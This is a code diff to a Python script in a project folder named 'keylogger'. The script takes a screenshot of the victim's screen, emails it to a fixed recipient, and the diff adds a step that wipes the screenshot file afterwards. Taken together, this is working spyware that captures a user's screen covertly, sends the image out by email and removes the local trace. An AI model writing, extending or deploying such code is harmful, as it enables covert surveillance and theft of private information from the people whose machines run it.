@@ -7,6 +7,8 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 
+import os
+
 file_path = "C:\\Users\\bardh\\OneDrive\\Desktop\\keylogger\\KeyLogger Project"     # Change dest file path before test
 extension = "\\"
 
@@ -21,7 +23,7 @@ def capture_screen():
     img = ImageGrab.grab()
     img.save(file_path + extension + screenshot)
 
-# Function to send fake email
+# Function to send screenshot through email
 def send_email(filename, attachment, email_recipient):
     from_address = email_address
 
@@ -46,6 +48,13 @@ def send_email(filename, attachment, email_recipient):
     text = msg.as_string()
     s.sendmail(from_address, email_recipient, text)
     s.quit()
+
+# Deletes the content in the text file
+if os.path.exists("screenshot.jpg"):
+    with open("screenshot.jpg", "r") as f:
+        f = open("screenshot.jpg", "r+")
+        f.seek(0)
+        f.truncate()
 
 capture_screen()
 send_email(screenshot, file_path + extension + screenshot, email_recipient)
